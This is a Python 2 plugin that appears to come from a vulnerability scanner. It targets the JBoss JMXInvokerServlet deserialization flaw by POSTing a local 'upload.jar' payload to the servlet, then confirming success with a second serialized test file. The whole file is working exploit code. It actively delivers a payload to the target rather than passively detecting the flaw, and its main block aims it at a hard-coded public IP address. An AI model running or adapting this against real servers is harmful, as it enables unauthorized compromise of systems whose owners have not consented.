#coding:utf-8

import urllib2
import binascii
import time


from t import T


def readfile(path):
    data=None
    file_object = open(path,'rb')
    try:
        data = file_object.read( )
    finally:
        file_object.close( )
    return data

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        timeout=3
        target_url = 'http://'+ip+':'+port
        result = {}
        result['result']=False
        res=None
        vul_url = target_url+"/invoker/JMXInvokerServlet"
        import os
        upload_jar = readfile(os.path.split(os.path.realpath(__file__))[0]+'/upload.jar')


        vul_test=readfile(os.path.split(os.path.realpath(__file__))[0]+'/vultest.dat')

        try:
            urllib2.urlopen(vul_url,upload_jar)
            res = urllib2.urlopen(vul_url,vul_test)
            if 'vultest11111' in res.read():
                info= vul_url +" Jboss Unserialization vul"
                result['result']=True
                result['VerifyInfo'] = {}
                result['VerifyInfo']['type']='Jboss Unserialization vul'
                result['VerifyInfo']['URL'] =target_url
                result['VerifyInfo']['payload']=vul_url
                result['VerifyInfo']['result'] =info
                result['VerifyInfo']['level'] = 'hole'
            return result
        except Exception,e:
            return result
        finally:
            if res is not None:
                res.close()
            del upload_jar
            del vul_test
            

           

if __name__ == '__main__':
    print P().verify(ip='1.202.164.105',port='8080')      